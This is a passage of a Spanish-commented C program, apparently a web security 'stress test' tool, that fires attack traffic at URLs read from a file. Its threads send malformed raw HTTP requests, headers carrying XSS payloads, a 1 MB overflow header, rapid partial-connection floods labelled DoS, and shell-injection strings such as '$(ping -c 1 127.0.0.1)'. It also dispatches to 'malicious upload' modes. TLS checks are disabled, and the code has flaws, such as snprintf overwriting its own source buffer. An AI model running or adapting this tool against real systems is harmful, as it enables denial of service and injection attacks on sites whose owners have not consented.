                // Cabecera mal formada causó un error HTTP
                char error_msg[256];
                snprintf(error_msg, sizeof(error_msg), "HTTP_MALFORMED_ERROR: %ld", response_code);

                if (data->log_dir) {
                    log_error(data->log_dir, data->thread_id, url, error_msg, response_code);
                }

                data->error_count++;
            }
        }

        data->total_time += request_time;

        // Liberar buffer
        if (read_buffer.data) {
            free(read_buffer.data);
            read_buffer.data = NULL;
            read_buffer.size = 0;
        }

        request_count++;

        // Pequeña pausa para distribuir la carga
        usleep(10000); // 10ms
    }

    data->active = 0; // Marcar hilo como inactivo

    if (headers) {
        curl_slist_free_all(headers);
    }
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    printf("Hilo %d (cabeceras mal formadas) completado. Éxitos: %d, Errores: %d\n",
           data->thread_id, data->success_count, data->error_count);

    return NULL;
}

void *perform_invalid_requests_test(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int request_count = 0;
    time_t start_time = time(NULL);
    int url_index = 0;

    printf("Hilo %d iniciando pruebas con solicitudes HTTP inválidas\n", data->thread_id);

    // Crear directorio de logs si no existe
    if (data->log_dir) {
        create_directory(data->log_dir);
    }

    // Realizar las solicitudes inválidas directamente con sockets
    while (1) {
        // Verificar límite de duración
        if (data->duration_seconds > 0 && (time(NULL) - start_time) >= data->duration_seconds) {
            break;
        }

        // Verificar límite de solicitudes
        if (data->requests_per_thread > 0 && request_count >= data->requests_per_thread) {
            break;
        }

        // Seleccionar URL aleatoriamente de la lista
        url_index = rand() % data->url_count;
        const char *url = data->urls[url_index];

        // Parsear URL para obtener host y puerto
        char host[256];
        int port = 80;

        // Extraer host y puerto de la URL
        const char *host_start = url;
        if (strncmp(url, "http://", 7) == 0) {
            host_start = url + 7;
        } else if (strncmp(url, "https://", 8) == 0) {
            host_start = url + 8;
            if (port == 80) port = 443;  // Cambiar a puerto HTTPS por defecto
        }

        // Copiar host
        int i = 0;
        while (host_start[i] != '\0' && host_start[i] != ':' && host_start[i] != '/' && i < 255) {
            host[i] = host_start[i];
            i++;
        }
        host[i] = '\0';

        // Verificar si hay puerto explícito
        const char *port_pos = strchr(host_start, ':');
        if (port_pos != NULL) {
            port = atoi(port_pos + 1);
        }

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, "SOCKET_CREATION_FAILED", 0);
            }
            data->error_count++;
            request_count++;
            usleep(10000); // Pequeña pausa para distribuir la carga
            continue;
        }

        struct hostent *server = gethostbyname(host);
        if (server == NULL) {
            close(sock);
            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, "GETHOSTBYNAME_FAILED", 0);
            }
            data->error_count++;
            request_count++;
            usleep(10000); // Pequeña pausa para distribuir la carga
            continue;
        }

        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        memcpy(&server_addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
        server_addr.sin_port = htons(port);

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, "CONNECTION_FAILED", 0);
            }
            data->error_count++;
            request_count++;
            usleep(10000); // Pequeña pausa para distribuir la carga
            continue;
        }

        // Enviar solicitudes HTTP inválidas
        const char* invalid_requests[] = {
            "GET / HTTP/1.1\r\nHost: \r\n\r\n",  // Host vacío
            "GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: -1\r\n\r\n",  // Content-Length negativo
            "POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 999999999999999\r\n\r\n",  // Content-Length excesivo
            "GET / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: gzip, chunked\r\n\r\n",  // Duplicado Transfer-Encoding
            "GET / HTTP/1.1\r\nHost: localhost\r\nX-Content-Length: 10\r\nContent-Length: 5\r\n\r\n",  // Conflicto Content-Length
            "INVALIDMETHOD / HTTP/1.1\r\nHost: localhost\r\n\r\n",  // Método inválido
            "GET / HTTP/2.0\r\nHost: localhost\r\n\r\n",  // Versión HTTP inválida
            "GET / HTTP/1.1\r\nHost: localhost\r\nX-Script: <script>alert('XSS')</script>\r\n\r\n",  // XSS en header
            "GET / HTTP/1.1\r\nHost: localhost\r\nX-SQL: SELECT * FROM users WHERE id=1 OR 1=1\r\n\r\n",  // SQL injection en header
            "GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\nConnection: keep-alive\r\n\r\n"  // Duplicado Connection
        };

        int req_index = rand() % 10;
        const char* request = invalid_requests[req_index];

        ssize_t sent = send(sock, request, strlen(request), 0);

        if (sent < 0) {
            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, "SEND_FAILED", 0);
            }
            data->error_count++;
        } else {
            data->success_count++;
            if (data->log_dir) {
                char log_msg[512];
                snprintf(log_msg, sizeof(log_msg), "INVALID_REQUEST_SENT:%s", request);
                log_error(data->log_dir, data->thread_id, url, log_msg, 0);
            }
        }

        close(sock); // Cerrar conexión después de la solicitud inválida

        request_count++;

        // Pequeña pausa para distribuir la carga
        usleep(10000); // 10ms
    }

    data->active = 0; // Marcar hilo como inactivo

    printf("Hilo %d (solicitudes inválidas) completado. Éxitos: %d, Errores: %d\n",
           data->thread_id, data->success_count, data->error_count);

    return NULL;
}

void *perform_xss_attacks_test(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    CURL *curl;
    struct curl_buffer read_buffer;
    struct curl_slist *headers = NULL;
    int request_count = 0;
    time_t start_time = time(NULL);
    int url_index = 0;

    // Inicializar libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) {
        fprintf(stderr, "Error al inicializar curl en hilo %d\n", data->thread_id);
        return NULL;
    }

    // Configurar opciones comunes de curl
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "OPHELIA-Stress-Test/1.0");

    printf("Hilo %d iniciando pruebas de XSS\n", data->thread_id);

    // Crear directorio de logs si no existe
    if (data->log_dir) {
        create_directory(data->log_dir);
    }

    // Realizar las solicitudes con payloads XSS
    while (1) {
        // Verificar límite de duración
        if (data->duration_seconds > 0 && (time(NULL) - start_time) >= data->duration_seconds) {
            break;
        }

        // Verificar límite de solicitudes
        if (data->requests_per_thread > 0 && request_count >= data->requests_per_thread) {
            break;
        }

        // Seleccionar URL aleatoriamente de la lista
        url_index = rand() % data->url_count;
        const char *url = data->urls[url_index];

        // Configurar cabeceras con payloads XSS
        if (headers) {
            curl_slist_free_all(headers); // Liberar headers anteriores
        }
        headers = NULL;

        // Agregar cabeceras con payloads XSS
        headers = curl_slist_append(headers, "User-Agent: OPHELIA-Stress-Test/1.0");
        headers = curl_slist_append(headers, "Accept: */*");

        // Diferentes payloads XSS
        const char* xss_payloads[] = {
            "X-Forwarded-For: <script>alert('XSS')</script>",
            "X-Custom-Header: <img src=x onerror=alert('XSS')>",
            "X-Test: <svg onload=alert('XSS')>",
            "X-Request: javascript:alert('XSS')",
            "X-Injection: <iframe src=\"javascript:alert('XSS')\"></iframe>",
            "X-Payload: <body onload=alert('XSS')>"
        };

        int payload_index = rand() % 6;
        headers = curl_slist_append(headers, xss_payloads[payload_index]);

        headers = curl_slist_append(headers, "Connection: close");

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Reiniciar buffer de lectura
        read_buffer.data = malloc(1);
        read_buffer.size = 0;

        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        struct timeval start_req, end_req;
        gettimeofday(&start_req, NULL);

        CURLcode res = curl_easy_perform(curl);

        gettimeofday(&end_req, NULL);
        double request_time = (end_req.tv_sec - start_req.tv_sec) +
                             (end_req.tv_usec - start_req.tv_usec) / 1000000.0;

        if (res != CURLE_OK) {
            char error_msg[256];
            snprintf(error_msg, sizeof(error_msg), "XSS_ATTACK_ERROR: %s", curl_easy_strerror(res));

            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, error_msg, 0);
            }

            data->error_count++;
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

            if (response_code >= 200 && response_code < 300) {
                data->success_count++; // Aunque sea XSS, si responde, contamos como intento

                if (data->log_dir) {
                    log_success(data->log_dir, data->thread_id, url, response_code, request_time);
                }
            } else {
                char error_msg[256];
                snprintf(error_msg, sizeof(error_msg), "XSS_ATTACK_HTTP_ERROR: %ld", response_code);

                if (data->log_dir) {
                    log_error(data->log_dir, data->thread_id, url, error_msg, response_code);
                }

                data->error_count++;
            }
        }

        data->total_time += request_time;

        // Liberar buffer
        if (read_buffer.data) {
            free(read_buffer.data);
            read_buffer.data = NULL;
            read_buffer.size = 0;
        }

        request_count++;

        // Pequeña pausa para distribuir la carga
        usleep(10000); // 10ms
    }

    data->active = 0; // Marcar hilo como inactivo

    if (headers) {
        curl_slist_free_all(headers);
    }
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    printf("Hilo %d (XSS attacks) completado. Éxitos: %d, Errores: %d\n",
           data->thread_id, data->success_count, data->error_count);

    return NULL;
}

// Función para pruebas de desbordamiento de búfer
void *perform_buffer_overflow_test(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    CURL *curl;
    struct curl_buffer read_buffer;
    struct curl_slist *headers = NULL;
    int request_count = 0;
    time_t start_time = time(NULL);
    int url_index = 0;

    // Inicializar libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) {
        fprintf(stderr, "Error al inicializar curl en hilo %d\n", data->thread_id);
        return NULL;
    }

    // Configurar opciones comunes de curl
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "OPHELIA-Stress-Test/1.0");

    printf("Hilo %d iniciando pruebas de desbordamiento de búfer\n", data->thread_id);

    // Crear directorio de logs si no existe
    if (data->log_dir) {
        create_directory(data->log_dir);
    }

    // Realizar las solicitudes con payloads de buffer overflow
    while (1) {
        // Verificar límite de duración
        if (data->duration_seconds > 0 && (time(NULL) - start_time) >= data->duration_seconds) {
            break;
        }

        // Verificar límite de solicitudes
        if (data->requests_per_thread > 0 && request_count >= data->requests_per_thread) {
            break;
        }

        // Seleccionar URL aleatoriamente de la lista
        url_index = rand() % data->url_count;
        const char *url = data->urls[url_index];

        // Configurar cabeceras con payloads de buffer overflow
        if (headers) {
            curl_slist_free_all(headers); // Liberar headers anteriores
        }
        headers = NULL;

        // Crear una cabecera extremadamente larga para probar buffer overflow
        char *long_header = malloc(1024 * 1024); // 1MB de cabecera
        if (long_header) {
            // Llenar con caracteres para probar buffer overflow
            for (int i = 0; i < 1024 * 1024 - 30; i++) {
                long_header[i] = 'A' + (i % 26); // Letras A-Z repetidas
            }
            long_header[1024 * 1024 - 30] = '\0'; // Terminador nulo

            snprintf(long_header, 1024 * 1024, "X-Long-Header: %s", long_header + 13);
        }

        headers = curl_slist_append(headers, "User-Agent: OPHELIA-Stress-Test/1.0");
        headers = curl_slist_append(headers, "Accept: */*");

        if (long_header) {
            headers = curl_slist_append(headers, long_header);
        } else {
            // Alternativa si no se puede asignar memoria
            char alt_header[512];
            memset(alt_header, 'A', 500);
            alt_header[500] = '\0';
            snprintf(alt_header, sizeof(alt_header), "X-Overflow: %s", alt_header);
            headers = curl_slist_append(headers, alt_header);
        }

        headers = curl_slist_append(headers, "Connection: close");

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Reiniciar buffer de lectura
        read_buffer.data = malloc(1);
        read_buffer.size = 0;

        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        struct timeval start_req, end_req;
        gettimeofday(&start_req, NULL);

        CURLcode res = curl_easy_perform(curl);

        gettimeofday(&end_req, NULL);
        double request_time = (end_req.tv_sec - start_req.tv_sec) +
                             (end_req.tv_usec - start_req.tv_usec) / 1000000.0;

        if (res != CURLE_OK) {
            char error_msg[256];
            snprintf(error_msg, sizeof(error_msg), "BUFFER_OVERFLOW_ERROR: %s", curl_easy_strerror(res));

            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, error_msg, 0);
            }

            data->error_count++;
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

            if (response_code >= 200 && response_code < 300) {
                data->success_count++; // Aunque sea buffer overflow, si responde, contamos como intento

                if (data->log_dir) {
                    log_success(data->log_dir, data->thread_id, url, response_code, request_time);
                }
            } else {
                char error_msg[256];
                snprintf(error_msg, sizeof(error_msg), "BUFFER_OVERFLOW_HTTP_ERROR: %ld", response_code);

                if (data->log_dir) {
                    log_error(data->log_dir, data->thread_id, url, error_msg, response_code);
                }

                data->error_count++;
            }
        }

        data->total_time += request_time;

        // Liberar buffer
        if (read_buffer.data) {
            free(read_buffer.data);
            read_buffer.data = NULL;
            read_buffer.size = 0;
        }

        // Liberar la cabecera larga
        if (long_header) {
            free(long_header);
        }

        request_count++;

        // Pequeña pausa para distribuir la carga
        usleep(10000); // 10ms
    }

    data->active = 0; // Marcar hilo como inactivo

    if (headers) {
        curl_slist_free_all(headers);
    }
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    printf("Hilo %d (buffer overflow) completado. Éxitos: %d, Errores: %d\n",
           data->thread_id, data->success_count, data->error_count);

    return NULL;
}

void *perform_dos_attacks_test(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int request_count = 0;
    time_t start_time = time(NULL);
    int url_index = 0;

    printf("Hilo %d iniciando pruebas de DoS\n", data->thread_id);

    // Crear directorio de logs si no existe
    if (data->log_dir) {
        create_directory(data->log_dir);
    }

    // Realizar múltiples solicitudes rápidas para intentar DoS
    while (1) {
        // Verificar límite de duración
        if (data->duration_seconds > 0 && (time(NULL) - start_time) >= data->duration_seconds) {
            break;
        }

        // Verificar límite de solicitudes
        if (data->requests_per_thread > 0 && request_count >= data->requests_per_thread) {
            break;
        }

        // Seleccionar URL aleatoriamente de la lista
        url_index = rand() % data->url_count;
        const char *url = data->urls[url_index];

        // Parsear URL para obtener host y puerto
        char host[256];
        int port = 80;

        // Extraer host y puerto de la URL
        const char *host_start = url;
        if (strncmp(url, "http://", 7) == 0) {
            host_start = url + 7;
        } else if (strncmp(url, "https://", 8) == 0) {
            host_start = url + 8;
            if (port == 80) port = 443;  // Cambiar a puerto HTTPS por defecto
        }

        // Copiar host
        int i = 0;
        while (host_start[i] != '\0' && host_start[i] != ':' && host_start[i] != '/' && i < 255) {
            host[i] = host_start[i];
            i++;
        }
        host[i] = '\0';

        // Verificar si hay puerto explícito
        const char *port_pos = strchr(host_start, ':');
        if (port_pos != NULL) {
            port = atoi(port_pos + 1);
        }

        // Crear múltiples conexiones rápidas sin esperar respuesta completa
        for (int conn = 0; conn < 10; conn++) {  // 10 conexiones rápidas
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                if (data->log_dir) {
                    log_error(data->log_dir, data->thread_id, url, "DOS_SOCKET_CREATION_FAILED", 0);
                }
                continue;
            }

            struct hostent *server = gethostbyname(host);
            if (server == NULL) {
                close(sock);
                continue;
            }

            struct sockaddr_in server_addr;
            memset(&server_addr, 0, sizeof(server_addr));
            server_addr.sin_family = AF_INET;
            memcpy(&server_addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
            server_addr.sin_port = htons(port);

            if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) >= 0) {
                // Enviar una solicitud HTTP parcial para mantener la conexión ocupada
                const char* partial_request = "GET / HTTP/1.1\r\nHost: localhost\r\n";
                send(sock, partial_request, strlen(partial_request), 0);

                // No esperar respuesta, cerrar inmediatamente para intentar DoS
                close(sock);
                data->success_count++; // Contamos cada intento de conexión
            } else {
                close(sock);
                if (data->log_dir) {
                    log_error(data->log_dir, data->thread_id, url, "DOS_CONNECTION_FAILED", 0);
                }
                data->error_count++;
            }
        }

        request_count++;

        // Pequeña pausa para distribuir la carga
        usleep(5000); // 5ms
    }

    data->active = 0; // Marcar hilo como inactivo

    printf("Hilo %d (DoS attacks) completado. Éxitos: %d, Errores: %d\n",
           data->thread_id, data->success_count, data->error_count);

    return NULL;
}

void *perform_command_injection_test(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    CURL *curl;
    struct curl_buffer read_buffer;
    struct curl_slist *headers = NULL;
    int request_count = 0;
    time_t start_time = time(NULL);
    int url_index = 0;

    // Inicializar libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) {
        fprintf(stderr, "Error al inicializar curl en hilo %d\n", data->thread_id);
        return NULL;
    }

    // Configurar opciones comunes de curl
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "OPHELIA-Stress-Test/1.0");

    printf("Hilo %d iniciando pruebas de inyección de comandos\n", data->thread_id);

    // Crear directorio de logs si no existe
    if (data->log_dir) {
        create_directory(data->log_dir);
    }

    // Realizar las solicitudes con payloads de inyección de comandos
    while (1) {
        // Verificar límite de duración
        if (data->duration_seconds > 0 && (time(NULL) - start_time) >= data->duration_seconds) {
            break;
        }

        // Verificar límite de solicitudes
        if (data->requests_per_thread > 0 && request_count >= data->requests_per_thread) {
            break;
        }

        // Seleccionar URL aleatoriamente de la lista
        url_index = rand() % data->url_count;
        const char *url = data->urls[url_index];

        // Configurar cabeceras con payloads de inyección de comandos
        if (headers) {
            curl_slist_free_all(headers); // Liberar headers anteriores
        }
        headers = NULL;

        // Agregar cabeceras con payloads de inyección de comandos
        headers = curl_slist_append(headers, "User-Agent: OPHELIA-Stress-Test/1.0");
        headers = curl_slist_append(headers, "Accept: */*");

        // Diferentes payloads de inyección de comandos que pueden provocar cuelgues
        const char* cmd_payloads[] = {
            "X-Forwarded-For: 127.0.0.1; ping -c 1 127.0.0.1 #",
            "X-Custom-Header: `ping -c 1 127.0.0.1`",
            "X-Test: & ping -c 1 127.0.0.1 &",
            "X-Request: || ping -c 1 127.0.0.1 ||",
            "X-Injection: | ping -c 1 127.0.0.1 |",
            "X-Payload: $(ping -c 1 127.0.0.1)"
        };

        int payload_index = rand() % 6;
        headers = curl_slist_append(headers, cmd_payloads[payload_index]);

        headers = curl_slist_append(headers, "Connection: close");

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Reiniciar buffer de lectura
        read_buffer.data = malloc(1);
        read_buffer.size = 0;

        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        struct timeval start_req, end_req;
        gettimeofday(&start_req, NULL);

        CURLcode res = curl_easy_perform(curl);

        gettimeofday(&end_req, NULL);
        double request_time = (end_req.tv_sec - start_req.tv_sec) +
                             (end_req.tv_usec - start_req.tv_usec) / 1000000.0;

        if (res != CURLE_OK) {
            char error_msg[256];
            snprintf(error_msg, sizeof(error_msg), "COMMAND_INJECTION_ERROR: %s", curl_easy_strerror(res));

            if (data->log_dir) {
                log_error(data->log_dir, data->thread_id, url, error_msg, 0);
            }

            data->error_count++;
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

            if (response_code >= 200 && response_code < 300) {
                data->success_count++; // Aunque sea command injection, si responde, contamos como intento

                if (data->log_dir) {
                    log_success(data->log_dir, data->thread_id, url, response_code, request_time);
                }
            } else {
                char error_msg[256];
                snprintf(error_msg, sizeof(error_msg), "COMMAND_INJECTION_HTTP_ERROR: %ld", response_code);

                if (data->log_dir) {
                    log_error(data->log_dir, data->thread_id, url, error_msg, response_code);
                }

                data->error_count++;
            }
        }

        data->total_time += request_time;

        // Liberar buffer
        if (read_buffer.data) {
            free(read_buffer.data);
            read_buffer.data = NULL;
            read_buffer.size = 0;
        }

        request_count++;

        // Pequeña pausa para distribuir la carga
        usleep(10000); // 10ms
    }

    data->active = 0; // Marcar hilo como inactivo

    if (headers) {
        curl_slist_free_all(headers);
    }
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    printf("Hilo %d (command injection) completado. Éxitos: %d, Errores: %d\n",
           data->thread_id, data->success_count, data->error_count);

    return NULL;
}

int main(int argc, char *argv[]) {

    char urls_file[MAX_URL_LENGTH] = "";
    int num_threads = DEFAULT_THREADS;
    int requests_per_thread = DEFAULT_REQUESTS;
    int duration_seconds = DEFAULT_DURATION;
    char log_dir[MAX_URL_LENGTH] = "./logs";
    test_type_t test_type = TEST_STANDARD;  // Valor por defecto
    int opt;

    // Parsear argumentos de línea de comandos
    while (1) {
        static struct option long_options[] = {
            {"urls", required_argument, 0, 'u'},
            {"threads", required_argument, 0, 't'},
            {"requests", required_argument, 0, 'r'},
            {"duration", required_argument, 0, 'd'},
            {"log-dir", required_argument, 0, 'l'},
            {"test-type", required_argument, 0, 'T'},
            {"help", no_argument, 0, 'h'},
            {0, 0, 0, 0}
        };

        int option_index = 0;
        opt = getopt_long(argc, argv, "u:t:r:d:l:T:h", long_options, &option_index);

        if (opt == -1) break;

        switch (opt) {
            case 'u':
                strncpy(urls_file, optarg, sizeof(urls_file) - 1);
                urls_file[sizeof(urls_file) - 1] = '\0';
                break;
            case 't':
                num_threads = atoi(optarg);
                if (num_threads <= 0) num_threads = DEFAULT_THREADS;
                if (num_threads > 50) num_threads = 50; // Límite razonable
                break;
            case 'r':
                requests_per_thread = atoi(optarg);
                if (requests_per_thread < 0) requests_per_thread = DEFAULT_REQUESTS;
                break;
            case 'd':
                duration_seconds = atoi(optarg);
                if (duration_seconds < 0) duration_seconds = DEFAULT_DURATION;
                break;
            case 'l':
                strncpy(log_dir, optarg, sizeof(log_dir) - 1);
                log_dir[sizeof(log_dir) - 1] = '\0';
                break;
            case 'T': {
                if (strcmp(optarg, "standard") == 0) {
                    test_type = TEST_STANDARD;
                } else if (strcmp(optarg, "incomplete") == 0) {
                    test_type = TEST_INCOMPLETE_CONNECTIONS;
                } else if (strcmp(optarg, "malformed") == 0) {
                    test_type = TEST_MALFORMED_HEADERS;
                } else if (strcmp(optarg, "invalid") == 0) {
                    test_type = TEST_INVALID_REQUESTS;
                } else if (strcmp(optarg, "xss") == 0) {
                    test_type = TEST_XSS_ATTACKS;
                } else if (strcmp(optarg, "buffer") == 0) {
                    test_type = TEST_BUFFER_OVERFLOW;
                } else if (strcmp(optarg, "dos") == 0) {
                    test_type = TEST_DOS_ATTACKS;
                } else if (strcmp(optarg, "command") == 0) {
                    test_type = TEST_COMMAND_INJECTION;
                } else if (strcmp(optarg, "upload-standard") == 0) {
                    test_type = TEST_FILE_UPLOAD_STANDARD;
                } else if (strcmp(optarg, "upload-malicious") == 0) {
                    test_type = TEST_FILE_UPLOAD_MALICIOUS;
                } else {
                    printf("ERROR: Tipo de prueba desconocido: %s\n", optarg);
                    print_help(argv[0]);
                    return 1;
                }
                break;
            }
            case 'h':
                print_help(argv[0]);
                return 0;
            default:
                print_help(argv[0]);
                return 1;
        }
    }
    
    if (strlen(urls_file) == 0) {
        printf("ERROR: Debe especificar un archivo con URLs usando -u o --urls\n\n");
        print_help(argv[0]);
        return 1;
    }
    
    // Leer URLs desde archivo
    FILE *fp = fopen(urls_file, "r");
    if (!fp) {
        perror("No se pudo abrir el archivo de URLs");
        return 1;
    }
    
    char **urls = malloc(MAX_URLS * sizeof(char*));
    int url_count = 0;
    char line[MAX_URL_LENGTH];
    
    while (fgets(line, sizeof(line), fp) && url_count < MAX_URLS) {
        // Eliminar salto de línea al final
        line[strcspn(line, "\r\n")] = 0;
        
        // Si la línea no está vacía, añadirla a la lista
        if (strlen(line) > 0) {
            urls[url_count] = malloc(strlen(line) + 1);
            strcpy(urls[url_count], line);
            url_count++;
        }
    }
    
    fclose(fp);
    
    if (url_count == 0) {
        printf("ERROR: No se encontraron URLs en el archivo %s\n", urls_file);
        return 1;
    }
    
    printf("\nCONFIGURACIÓN DE LA PRUEBA:\n");
    printf("- Archivo de URLs: %s\n", urls_file);
    printf("- URLs disponibles: %d\n", url_count);
    printf("- Hilos concurrentes: %d\n", num_threads);
    printf("- Solicitudes por hilo: %s\n", 
           requests_per_thread > 0 ? "ilimitado" : "ilimitado");
    printf("- Duración máxima: %s\n", 
           duration_seconds > 0 ? "ilimitado" : "ilimitado");
    printf("- Directorio de logs: %s\n", log_dir);
    printf("- Total de solicitudes: %s\n", 
           (requests_per_thread > 0 ? "ilimitado" : "ilimitado"));
    printf("- URLs aleatorias: SÍ\n\n");
    
    // Mostrar las primeras 5 URLs
    printf("PRIMERAS 5 URLS A PROBAR:\n");
    for (int i = 0; i < url_count && i < 5; i++) {
        printf("  %s\n", urls[i]);
    }
    if (url_count > 5) {
        printf("  ... y %d más\n", url_count - 5);
    }
    printf("\n");
    
    // Crear directorio de logs
    create_directory(log_dir);
    
    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    thread_data_t *thread_data = malloc(num_threads * sizeof(thread_data_t));
    
    time_t start_time = time(NULL);
    
    // Inicializar datos de cada hilo
    for (int i = 0; i < num_threads; i++) {
        thread_data[i].urls = urls;
        thread_data[i].url_count = url_count;
        thread_data[i].thread_id = i + 1;
        thread_data[i].requests_per_thread = requests_per_thread;
        thread_data[i].duration_seconds = duration_seconds;
        thread_data[i].success_count = 0;
        thread_data[i].error_count = 0;
        thread_data[i].total_time = 0.0;
        thread_data[i].active = 1;
        thread_data[i].log_dir = log_dir;  // Pasar directorio de logs
        
        thread_data[i].test_type = test_type;  // Tipo de prueba

        void *(*test_function)(void *);

        switch(test_type) {
            case TEST_STANDARD:
                test_function = perform_standard_test;
                break;
            case TEST_INCOMPLETE_CONNECTIONS:
                test_function = perform_incomplete_connections_test;
                break;
            case TEST_MALFORMED_HEADERS:
                test_function = perform_malformed_headers_test;
                break;
            case TEST_INVALID_REQUESTS:
                test_function = perform_invalid_requests_test;
                break;
            case TEST_XSS_ATTACKS:
                test_function = perform_xss_attacks_test;
                break;
            case TEST_BUFFER_OVERFLOW:
                test_function = perform_buffer_overflow_test;
                break;
            case TEST_DOS_ATTACKS:
                test_function = perform_dos_attacks_test;
                break;
            case TEST_COMMAND_INJECTION:
                test_function = perform_command_injection_test;
                break;
            case TEST_FILE_UPLOAD_STANDARD:
                test_function = perform_file_upload_standard_test;
                break;
            case TEST_FILE_UPLOAD_MALICIOUS:
                test_function = perform_file_upload_malicious_test;
                break;
            default:
                test_function = perform_standard_test;  // Por defecto
                break;
        }

        int rc = pthread_create(&threads[i], NULL, test_function, &thread_data[i]);
        if (rc) {
            fprintf(stderr, "Error al crear hilo %d; código de retorno: %d\n", i, rc);
            return 1;
        }
    }
    
    printf("Iniciando prueba de estrés...\n");
    
    // Mostrar estado periódicamente
    int interval = duration_seconds > 0 ? duration_seconds / 10 : 20; // Mostrar cada 20 segundos o 1/10 del tiempo
    if (interval < 5) interval = 5; // Mínimo 5 segundos
    
    while (1) {
        sleep(interval);
        
        // Verificar si todos los hilos han terminado
        int all_inactive = 1;
        for (int i = 0; i < num_threads; i++) {
            if (thread_data[i].active) {
                all_inactive = 0;
                break;
            }
        }
        
        if (all_inactive) break;
        
        // Mostrar estado actual
        int total_success = 0;
        int total_errors = 0;
        for (int i = 0; i < num_threads; i++) {
            total_success += thread_data[i].success_count;
            total_errors += thread_data[i].error_count;
        }
        
        printf("Estado actual (después de %ld segundos): %d éxitos, %d errores\n", 
               time(NULL) - start_time, total_success, total_errors);
    }
    
    // Esperar a que todos los hilos terminen
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    time_t end_time = time(NULL);
    double elapsed_time = difftime(end_time, start_time);
    
    // Calcular estadísticas finales
    int total_requests = 0;
    int total_success = 0;
    int total_errors = 0;
    double total_time = 0.0;
    
    for (int i = 0; i < num_threads; i++) {
        total_success += thread_data[i].success_count;
        total_errors += thread_data[i].error_count;
        total_time += thread_data[i].total_time;
        total_requests += thread_data[i].success_count + thread_data[i].error_count;
    }
    
    printf("\n-----------------------------------------\n");
    printf("    RESULTADOS FINALES DE LA PRUEBA\n");
    printf("-----------------------------------------\n");
    printf("Tiempo total de prueba: %.2f segundos\n", elapsed_time);
    printf("Solicitudes totales: %d\n", total_requests);
    printf("Solicitudes exitosas: %d\n", total_success);
    printf("Errores: %d\n", total_errors);
    if (total_requests > 0) {
        printf("Tasa de éxito: %.2f%%\n", (total_success * 100.0) / total_requests);
